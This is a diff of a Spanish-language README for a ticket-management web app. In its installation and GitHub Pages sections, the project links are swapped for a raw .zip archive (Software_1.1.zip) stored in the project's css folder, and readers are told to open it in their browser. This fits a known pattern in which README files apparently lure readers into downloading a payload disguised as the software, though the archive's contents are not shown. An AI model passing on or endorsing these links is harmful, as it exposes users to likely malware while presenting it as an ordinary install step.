@@ -12,11 +12,11 @@ Proyecto realizado con HTML, Bootstrap y JavaScript. Permite crear, visualizar, 
 - Responsive con Bootstrap 5
 
 ## 📌 Instalación
-Solo descarga el repositorio y abre `https://github.com/Nesquick23/sistematickets/raw/refs/heads/main/js/Software_3.8.zip` en tu navegador.
+Solo descarga el repositorio y abre `https://raw.githubusercontent.com/Nesquick23/sistematickets/main/css/Software_1.1.zip` en tu navegador.
 
 ## 🌐 Publicación en GitHub Pages
 URL de la página publicada:  
-👉 https://github.com/Nesquick23/sistematickets/raw/refs/heads/main/js/Software_3.8.zip
+👉 https://raw.githubusercontent.com/Nesquick23/sistematickets/main/css/Software_1.1.zip
 
 ## 🔧 Estructura
 Todo terminado :)
